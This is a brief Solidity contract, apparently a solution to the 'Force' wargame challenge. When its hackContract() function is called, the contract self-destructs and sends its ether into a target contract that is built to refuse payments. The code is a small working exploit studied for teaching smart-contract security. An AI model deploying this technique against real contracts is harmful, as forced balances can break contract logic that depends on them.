// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public forceAddress;

    constructor(address _forceAddress) payable {
        forceAddress = _forceAddress;
    }

    function hackContract() external {
        selfdestruct(payable(forceAddress));
    }
}
